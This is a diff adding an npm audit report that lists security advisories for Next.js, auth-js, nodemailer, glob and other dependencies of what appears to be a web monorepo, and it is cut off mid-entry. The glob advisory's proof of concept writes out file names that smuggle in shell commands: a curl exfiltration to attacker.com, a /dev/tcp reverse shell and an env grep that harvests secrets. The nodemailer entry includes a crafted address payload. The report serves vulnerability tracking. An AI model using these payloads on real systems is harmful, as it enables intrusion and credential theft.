+      "references": "- https://github.com/supabase/auth-js/security/advisories/GHSA-8r88-6cj9-9fh5\n- https://github.com/supabase/auth-js/pull/1063\n- https://github.com/supabase/auth-js/commit/1bcb76e479e51cd9bca2d7732d0bf3199e07a693\n- https://nvd.nist.gov/vuln/detail/CVE-2025-48370\n- https://github.com/advisories/GHSA-8r88-6cj9-9fh5",
+      "created": "2025-05-27T18:00:17.000Z",
+      "id": 1105091,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nThe library functions `getUserById`, `deleteUser`, `updateUserById`, `listFactors` and `deleteFactor` did not require the user supplied values to be valid UUIDs. This could lead to a URL path traversal, resulting in the wrong API function being called.\n\nImplementations that follow security best practice and validate user controlled inputs, such as the `userId` are not affected by this.\n\n### Patches\nStrict value checks have been added to all affected functions. These functions now require that the `userId` and `factorId` parameters MUST be valid UUID (v4).\n\n**Patched version:** >= 2.69.1\n\n### Workarounds\nImplementations that follow security best practice and validate user controlled inputs, such as the `userId` are not affected by this. It is recommended that users of the auth-js library always follow security best practice and validate all inputs, before passing these to other functions or libraries.\n\n### References\nhttps://github.com/supabase/auth-js/pull/1063",
+      "reported_by": null,
+      "title": "auth-js Vulnerable to Insecure Path Routing from Malformed User Input",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-48370"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "@supabase/auth-js",
+      "vulnerable_versions": "<2.69.1",
+      "github_advisory_id": "GHSA-8r88-6cj9-9fh5",
+      "recommendation": "Upgrade to version 2.69.1 or later",
+      "patched_versions": ">=2.69.1",
+      "updated": "2025-05-28T19:42:24.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-22"
+      ],
+      "url": "https://github.com/advisories/GHSA-8r88-6cj9-9fh5"
+    },
+    "1105461": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-3h52-269p-cp9r\n- https://vercel.com/changelog/cve-2025-48068\n- https://nvd.nist.gov/vuln/detail/CVE-2025-48068\n- https://github.com/advisories/GHSA-3h52-269p-cp9r",
+      "created": "2025-05-28T21:52:13.000Z",
+      "id": 1105461,
+      "npm_advisory_id": null,
+      "overview": "## Summary\n\nA low-severity vulnerability in **Next.js** has been fixed in **version 15.2.2**. This issue may have allowed limited source code exposure when the dev server was running with the App Router enabled. The vulnerability only affects local development environments and requires the user to visit a malicious webpage while `npm run dev` is active.\n\nBecause the mitigation is potentially a breaking change for some development setups, to opt-in to the fix, you must configure `allowedDevOrigins` in your next config after upgrading to a patched version. [Learn more](https://nextjs.org/docs/app/api-reference/config/next-config-js/allowedDevOrigins).\n\nLearn more: https://vercel.com/changelog/cve-2025-48068\n\n## Credit\n\nThanks to [sapphi-red](https://github.com/sapphi-red) and [Radman Siddiki](https://github.com/R4356th) for responsibly disclosing this issue.",
+      "reported_by": null,
+      "title": "Information exposure in Next.js dev server due to lack of origin verification",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-48068"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=13.0 <14.2.30",
+      "github_advisory_id": "GHSA-3h52-269p-cp9r",
+      "recommendation": "Upgrade to version 14.2.30 or later",
+      "patched_versions": ">=14.2.30",
+      "updated": "2025-06-13T14:41:22.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-1385"
+      ],
+      "url": "https://github.com/advisories/GHSA-3h52-269p-cp9r"
+    },
+    "1107226": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-g5qg-72qw-gw5v\n- https://github.com/vercel/next.js/pull/82114\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- https://vercel.com/changelog/cve-2025-57752\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57752\n- https://github.com/advisories/GHSA-g5qg-72qw-gw5v",
+      "created": "2025-08-29T22:06:22.000Z",
+      "id": 1107226,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in Next.js Image Optimization has been fixed in v15.4.5 and v14.2.31. When images returned from API routes vary based on request headers (such as `Cookie` or `Authorization`), these responses could be incorrectly cached and served to unauthorized users due to a cache key confusion bug.\n\nAll users are encouraged to upgrade if they use API routes to serve images that depend on request headers and have image optimization enabled.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57752)",
+      "reported_by": null,
+      "title": "Next.js Affected by Cache Key Confusion for Image Optimization API Routes",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57752"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.31",
+      "github_advisory_id": "GHSA-g5qg-72qw-gw5v",
+      "recommendation": "Upgrade to version 14.2.31 or later",
+      "patched_versions": ">=14.2.31",
+      "updated": "2025-09-03T13:01:55.000Z",
+      "cvss": {
+        "score": 6.2,
+        "vectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-524"
+      ],
+      "url": "https://github.com/advisories/GHSA-g5qg-72qw-gw5v"
+    },
+    "1107420": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-7gfc-8cq8-jh5f\n- https://github.com/vercel/next.js/commit/1c8234eb20bc8afd396b89999a00f06b61d72d7b\n- https://nvd.nist.gov/vuln/detail/CVE-2024-51479\n- https://github.com/vercel/next.js/releases/tag/v14.2.15\n- https://github.com/advisories/GHSA-7gfc-8cq8-jh5f",
+      "created": "2024-12-17T15:09:06.000Z",
+      "id": 1107420,
+      "npm_advisory_id": null,
+      "overview": "### Impact\nIf a Next.js application is performing authorization in middleware based on pathname, it was possible for this authorization to be bypassed.\n\n### Patches\nThis issue was patched in Next.js `14.2.15` and later.\n\nIf your Next.js application is hosted on Vercel, this vulnerability has been automatically mitigated, regardless of Next.js version.\n\n### Workarounds\nThere are no official workarounds for this vulnerability.\n\n#### Credits\nWe'd like to thank [tyage](http://github.com/tyage) (GMO CyberSecurity by IERAE) for responsible disclosure of this issue.",
+      "reported_by": null,
+      "title": "Next.js authorization bypass vulnerability",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-51479"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "next",
+      "vulnerable_versions": ">=9.5.5 <14.2.15",
+      "github_advisory_id": "GHSA-7gfc-8cq8-jh5f",
+      "recommendation": "Upgrade to version 14.2.15 or later",
+      "patched_versions": ">=14.2.15",
+      "updated": "2025-09-10T21:12:24.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-285",
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-7gfc-8cq8-jh5f"
+    },
+    "1107512": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-4342-x723-ch2f\n- https://github.com/vercel/next.js/commit/9c9aaed5bb9338ef31b0517ccf0ab4414f2093d8\n- https://vercel.com/changelog/cve-2025-57822\n- https://nvd.nist.gov/vuln/detail/CVE-2025-57822\n- https://github.com/advisories/GHSA-4342-x723-ch2f",
+      "created": "2025-08-29T21:33:09.000Z",
+      "id": 1107512,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Middleware** has been fixed in **v14.2.32** and **v15.4.7**. The issue occurred when request headers were directly passed into `NextResponse.next()`. In self-hosted applications, this could allow Server-Side Request Forgery (SSRF) if certain sensitive headers from the incoming request were reflected back into the response.\n\nAll users implementing custom middleware logic in self-hosted environments are strongly encouraged to upgrade and verify correct usage of the `next()` function.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-57822)",
+      "reported_by": null,
+      "title": "Next.js Improper Middleware Redirect Handling Leads to SSRF",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-57822"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.32",
+      "github_advisory_id": "GHSA-4342-x723-ch2f",
+      "recommendation": "Upgrade to version 14.2.32 or later",
+      "patched_versions": ">=14.2.32",
+      "updated": "2025-09-11T15:41:03.000Z",
+      "cvss": {
+        "score": 6.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-918"
+      ],
+      "url": "https://github.com/advisories/GHSA-4342-x723-ch2f"
+    },
+    "1107513": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-xv57-4mr9-wg8v\n- https://github.com/vercel/next.js/commit/6b12c60c61ee80cb0443ccd20de82ca9b4422ddd\n- http://vercel.com/changelog/cve-2025-55173\n- https://nvd.nist.gov/vuln/detail/CVE-2025-55173\n- https://vercel.com/changelog/cve-2025-55173\n- https://github.com/advisories/GHSA-xv57-4mr9-wg8v",
+      "created": "2025-08-29T21:59:55.000Z",
+      "id": 1107513,
+      "npm_advisory_id": null,
+      "overview": "A vulnerability in **Next.js Image Optimization** has been fixed in **v15.4.5** and **v14.2.31**. The issue allowed attacker-controlled external image sources to trigger file downloads with arbitrary content and filenames under specific configurations. This behavior could be abused for phishing or malicious file delivery.\n\nAll users relying on `images.domains` or `images.remotePatterns` are encouraged to upgrade and verify that external image sources are strictly validated.\n\nMore details at [Vercel Changelog](https://vercel.com/changelog/cve-2025-55173)",
+      "reported_by": null,
+      "title": "Next.js Content Injection Vulnerability for Image Optimization",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-55173"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.31",
+      "github_advisory_id": "GHSA-xv57-4mr9-wg8v",
+      "recommendation": "Upgrade to version 14.2.31 or later",
+      "patched_versions": ">=14.2.31",
+      "updated": "2025-09-11T15:35:25.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-20"
+      ],
+      "url": "https://github.com/advisories/GHSA-xv57-4mr9-wg8v"
+    },
+    "1108189": {
+      "findings": [
+        {
+          "version": "0.6.0",
+          "paths": [
+            "web__ai-control-plane>ai>jsondiffpatch"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2025-9910\n- https://github.com/benjamine/jsondiffpatch/issues/383\n- https://github.com/benjamine/jsondiffpatch/commit/0e374b5dd8d7879b329a9fc18affbd46ad50dd14\n- https://benjamine.github.io/jsondiffpatch/index.html\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSBOWER-12549277\n- https://security.snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-12549276\n- https://security.snyk.io/vuln/SNYK-JS-JSONDIFFPATCH-10369031\n- https://github.com/advisories/GHSA-33vc-wfww-vjfv",
+      "created": "2025-09-11T06:30:23.000Z",
+      "id": 1108189,
+      "npm_advisory_id": null,
+      "overview": "### Vulnerability in jsondiffpatch\n\nVersions of `jsondiffpatch` prior to `0.7.2` are vulnerable to Cross-site Scripting (XSS) in the `HtmlFormatter` (`HtmlFormatter::nodeBegin`). When diffs are rendered to HTML using the built-in formatter, untrusted payloads can inject scripts and execute in the context of a consuming web page.\n\n**Affected versions:** >= 0, < 0.7.2\n**Patched version:** 0.7.2\n\n**Remediation**\nUpgrade to `jsondiffpatch` `0.7.2` or later. The fix hardens the HTML formatter to avoid script injection.\n\n**Workarounds**\nAvoid using the HTML formatter on untrusted diffs, or sanitize/escape the rendered output.",
+      "reported_by": null,
+      "title": "jsondiffpatch is vulnerable to Cross-site Scripting (XSS) via HtmlFormatter::nodeBegin",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-9910"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "jsondiffpatch",
+      "vulnerable_versions": "<0.7.2",
+      "github_advisory_id": "GHSA-33vc-wfww-vjfv",
+      "recommendation": "Upgrade to version 0.7.2 or later",
+      "patched_versions": ">=0.7.2",
+      "updated": "2025-09-22T22:45:33.000Z",
+      "cvss": {
+        "score": 4.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-33vc-wfww-vjfv"
+    },
+    "1108291": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-qpjv-v59x-3qc4\n- https://nvd.nist.gov/vuln/detail/CVE-2025-32421\n- https://vercel.com/changelog/cve-2025-32421\n- https://github.com/advisories/GHSA-qpjv-v59x-3qc4",
+      "created": "2025-05-15T14:12:26.000Z",
+      "id": 1108291,
+      "npm_advisory_id": null,
+      "overview": "**Summary**  \nWe received a responsible disclosure from Allam Rachid (zhero) for a low-severity race-condition vulnerability in Next.js. This issue only affects the **Pages Router** under certain misconfigurations, causing normal endpoints to serve `pageProps` data instead of standard HTML.\n\n[Learn more here](https://vercel.com/changelog/cve-2025-32421)\n\n**Credit**  \nThank you to **Allam Rachid (zhero)** for the responsible disclosure. This research was rewarded as part of our bug bounty program.",
+      "reported_by": null,
+      "title": "Next.js Race Condition to Cache Poisoning",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-32421"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "next",
+      "vulnerable_versions": ">=0.9.9 <14.2.24",
+      "github_advisory_id": "GHSA-qpjv-v59x-3qc4",
+      "recommendation": "Upgrade to version 14.2.24 or later",
+      "patched_versions": ">=14.2.24",
+      "updated": "2025-09-26T17:48:30.000Z",
+      "cvss": {
+        "score": 3.7,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"
+      },
+      "cwe": [
+        "CWE-362"
+      ],
+      "url": "https://github.com/advisories/GHSA-qpjv-v59x-3qc4"
+    },
+    "1108953": {
+      "findings": [
+        {
+          "version": "14.0.4",
+          "paths": [
+            "web__billing-site>next"
+          ]
+        },
+        {
+          "version": "14.2.3",
+          "paths": [
+            "web__web-backup-subscription-starter>next"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw\n- https://github.com/vercel/next.js/commit/52a078da3884efe6501613c7834a3d02a91676d2\n- https://github.com/vercel/next.js/commit/5fd3ae8f8542677c6294f32d18022731eab6fe48\n- https://nvd.nist.gov/vuln/detail/CVE-2025-29927\n- https://github.com/vercel/next.js/releases/tag/v12.3.5\n- https://github.com/vercel/next.js/releases/tag/v13.5.9\n- https://vercel.com/changelog/vercel-firewall-proactively-protects-against-vulnerability-with-middleware\n- http://www.openwall.com/lists/oss-security/2025/03/23/3\n- http://www.openwall.com/lists/oss-security/2025/03/23/4\n- https://security.netapp.com/advisory/ntap-20250328-0002\n- https://github.com/advisories/GHSA-f82v-jwr5-mffw",
+      "created": "2025-03-21T15:20:12.000Z",
+      "id": 1108953,
+      "npm_advisory_id": null,
+      "overview": "# Impact\nIt is possible to bypass authorization checks within a Next.js application, if the authorization check occurs in middleware.\n\n# Patches\n* For Next.js 15.x, this issue is fixed in `15.2.3`\n* For Next.js 14.x, this issue is fixed in `14.2.25`\n* For Next.js 13.x, this issue is fixed in 13.5.9\n* For Next.js 12.x, this issue is fixed in 12.3.5\n* For Next.js 11.x, consult the below workaround.\n\n_Note: Next.js deployments hosted on Vercel are automatically protected against this vulnerability._\n\n# Workaround\nIf patching to a safe version is infeasible, we recommend that you prevent external user requests which contain the `x-middleware-subrequest` header from reaching your Next.js application.\n\n## Credits\n\n- Allam Rachid (zhero;)\n- Allam Yasser (inzo_)",
+      "reported_by": null,
+      "title": "Authorization Bypass in Next.js Middleware",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-29927"
+      ],
+      "access": "public",
+      "severity": "critical",
+      "module_name": "next",
+      "vulnerable_versions": ">=14.0.0 <14.2.25",
+      "github_advisory_id": "GHSA-f82v-jwr5-mffw",
+      "recommendation": "Upgrade to version 14.2.25 or later",
+      "patched_versions": ">=14.2.25",
+      "updated": "2025-10-13T15:32:09.000Z",
+      "cvss": {
+        "score": 9.1,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N"
+      },
+      "cwe": [
+        "CWE-285",
+        "CWE-863"
+      ],
+      "url": "https://github.com/advisories/GHSA-f82v-jwr5-mffw"
+    },
+    "1109556": {
+      "findings": [
+        {
+          "version": "0.18.0",
+          "paths": [
+            "web__mobile>expo>@expo/cli>send"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/pillarjs/send/security/advisories/GHSA-m6fv-jmcg-4jfg\n- https://nvd.nist.gov/vuln/detail/CVE-2024-43799\n- https://github.com/pillarjs/send/commit/ae4f2989491b392ae2ef3b0015a019770ae65d35\n- https://lists.debian.org/debian-lts-announce/2025/06/msg00022.html\n- https://github.com/advisories/GHSA-m6fv-jmcg-4jfg",
+      "created": "2024-09-10T19:42:41.000Z",
+      "id": 1109556,
+      "npm_advisory_id": null,
+      "overview": "### Impact\n\npassing untrusted user input - even after sanitizing it - to `SendStream.redirect()` may execute untrusted code\n\n### Patches\n\nthis issue is patched in send 0.19.0\n\n### Workarounds\n\nusers are encouraged to upgrade to the patched version of express, but otherwise can workaround this issue by making sure any untrusted inputs are safe, ideally by validating them against an explicit allowlist\n\n### Details\n\nsuccessful exploitation of this vector requires the following:\n\n1. The attacker MUST control the input to response.redirect()\n1. express MUST NOT redirect before the template appears\n1. the browser MUST NOT complete redirection before:\n1. the user MUST click on the link in the template",
+      "reported_by": null,
+      "title": "send vulnerable to template injection that can lead to XSS",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-43799"
+      ],
+      "access": "public",
+      "severity": "low",
+      "module_name": "send",
+      "vulnerable_versions": "<0.19.0",
+      "github_advisory_id": "GHSA-m6fv-jmcg-4jfg",
+      "recommendation": "Upgrade to version 0.19.0 or later",
+      "patched_versions": ">=0.19.0",
+      "updated": "2025-11-03T22:48:05.000Z",
+      "cvss": {
+        "score": 5,
+        "vectorString": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L"
+      },
+      "cwe": [
+        "CWE-79"
+      ],
+      "url": "https://github.com/advisories/GHSA-m6fv-jmcg-4jfg"
+    },
+    "1109563": {
+      "findings": [
+        {
+          "version": "3.3.6",
+          "paths": [
+            "web__ai-control-plane>@ai-sdk/openai>@ai-sdk/provider-utils>nanoid"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://nvd.nist.gov/vuln/detail/CVE-2024-55565\n- https://github.com/ai/nanoid/pull/510\n- https://github.com/ai/nanoid/compare/3.3.7...3.3.8\n- https://github.com/ai/nanoid/releases/tag/5.0.9\n- https://lists.debian.org/debian-lts-announce/2024/12/msg00025.html\n- https://lists.debian.org/debian-lts-announce/2025/01/msg00006.html\n- https://github.com/advisories/GHSA-mwcw-c2x4-8c55",
+      "created": "2024-12-09T03:30:59.000Z",
+      "id": 1109563,
+      "npm_advisory_id": null,
+      "overview": "When nanoid is called with a fractional value, there were a number of undesirable effects:\n\n1. in browser and non-secure, the code infinite loops on while (size--)\n2. in node, the value of poolOffset becomes fractional, causing calls to nanoid to return zeroes until the pool is next filled\n3. if the first call in node is a fractional argument, the initial buffer allocation fails with an error\n\nVersion 3.3.8 and 5.0.9 are fixed.",
+      "reported_by": null,
+      "title": "Predictable results in nanoid generation when given non-integer values",
+      "metadata": null,
+      "cves": [
+        "CVE-2024-55565"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nanoid",
+      "vulnerable_versions": "<3.3.8",
+      "github_advisory_id": "GHSA-mwcw-c2x4-8c55",
+      "recommendation": "Upgrade to version 3.3.8 or later",
+      "patched_versions": ">=3.3.8",
+      "updated": "2025-11-04T16:54:56.000Z",
+      "cvss": {
+        "score": 4.3,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"
+      },
+      "cwe": [
+        "CWE-835"
+      ],
+      "url": "https://github.com/advisories/GHSA-mwcw-c2x4-8c55"
+    },
+    "1109804": {
+      "findings": [
+        {
+          "version": "6.10.1",
+          "paths": [
+            "templates__saas-landing>nodemailer"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/nodemailer/nodemailer/security/advisories/GHSA-mm7p-fcc7-pg87\n- https://github.com/nodemailer/nodemailer/commit/1150d99fba77280df2cfb1885c43df23109a8626\n- https://nvd.nist.gov/vuln/detail/CVE-2025-13033\n- https://access.redhat.com/security/cve/CVE-2025-13033\n- https://bugzilla.redhat.com/show_bug.cgi?id=2402179\n- https://github.com/advisories/GHSA-mm7p-fcc7-pg87",
+      "created": "2025-10-07T13:42:02.000Z",
+      "id": 1109804,
+      "npm_advisory_id": null,
+      "overview": "The email parsing library incorrectly handles quoted local-parts containing @. This leads to misrouting of email recipients, where the parser extracts and routes to an unintended domain instead of the RFC-compliant target.\n\nPayload: `\"xclow3n@gmail.com x\"@internal.domain`\nUsing the following code to send mail\n```\nconst nodemailer = require(\"nodemailer\");\n\nlet transporter = nodemailer.createTransport({\n  service: \"gmail\",\n  auth: {\n    user: \"\",\n    pass: \"\",\n  },\n});\n\nlet mailOptions = {\n  from: '\"Test Sender\" <your_email@gmail.com>', \n  to: \"\\\"xclow3n@gmail.com x\\\"@internal.domain\",\n  subject: \"Hello from Nodemailer\",\n  text: \"This is a test email sent using Gmail SMTP and Nodemailer!\",\n};\n\ntransporter.sendMail(mailOptions, (error, info) => {\n  if (error) {\n    return console.log(\"Error: \", error);\n  }\n  console.log(\"Message sent: %s\", info.messageId);\n\n});\n\n\n(async () => {\n  const parser = await import(\"@sparser/email-address-parser\");\n  const { EmailAddress, ParsingOptions } = parser.default;\n  const parsed = EmailAddress.parse(mailOptions.to /*, new ParsingOptions(true) */);\n\n  if (!parsed) {\n    console.error(\"Invalid email address:\", mailOptions.to);\n    return;\n  }\n\n  console.log(\"Parsed email:\", {\n    address: `${parsed.localPart}@${parsed.domain}`,\n    local: parsed.localPart,\n    domain: parsed.domain,\n  });\n})();\n```\n\nRunning the script and seeing how this mail is parsed according to RFC\n\n```\nParsed email: {\n  address: '\"xclow3n@gmail.com x\"@internal.domain',\n  local: '\"xclow3n@gmail.com x\"',\n  domain: 'internal.domain'\n}\n```\n\nBut the email is sent to `xclow3n@gmail.com`\n\n<img width=\"2128\" height=\"439\" alt=\"Image\" src=\"https://github.com/user-attachments/assets/20eb459c-9803-45a2-b30e-5d1177d60a8d\" />\n\n\n### Impact:\n\n-    Misdelivery / Data leakage: Email is sent to psres.net instead of test.com.\n\n-    Filter evasion: Logs and anti-spam systems may be bypassed by hiding recipients inside quoted local-parts.\n\n-    Potential compliance issue: Violates RFC 5321/5322 parsing rules.\n\n-    Domain based access control bypass in downstream applications using your library to send mails\n\n### Recommendations\n\n-    Fix parser to correctly treat quoted local-parts per RFC 5321/5322.\n\n-    Add strict validation rejecting local-parts containing embedded @ unless fully compliant with quoting.",
+      "reported_by": null,
+      "title": "Nodemailer: Email to an unintended domain can occur due to Interpretation Conflict",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-13033"
+      ],
+      "access": "public",
+      "severity": "moderate",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<7.0.7",
+      "github_advisory_id": "GHSA-mm7p-fcc7-pg87",
+      "recommendation": "Upgrade to version 7.0.7 or later",
+      "patched_versions": ">=7.0.7",
+      "updated": "2025-11-17T17:29:27.000Z",
+      "cvss": {
+        "score": 0,
+        "vectorString": null
+      },
+      "cwe": [
+        "CWE-20",
+        "CWE-436"
+      ],
+      "url": "https://github.com/advisories/GHSA-mm7p-fcc7-pg87"
+    },
+    "1109842": {
+      "findings": [
+        {
+          "version": "10.3.10",
+          "paths": [
+            "templates__odooops-console>jest>@jest/core>@jest/reporters>glob"
+          ]
+        }
+      ],
+      "found_by": null,
+      "deleted": null,
+      "references": "- https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2\n- https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146\n- https://nvd.nist.gov/vuln/detail/CVE-2025-64756\n- https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f\n- https://github.com/advisories/GHSA-5j98-mcp5-4vw2",
+      "created": "2025-11-17T17:38:56.000Z",
+      "id": 1109842,
+      "npm_advisory_id": null,
+      "overview": "### Summary\n\nThe glob CLI contains a command injection vulnerability in its `-c/--cmd` option that allows arbitrary command execution when processing files with malicious names. When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these 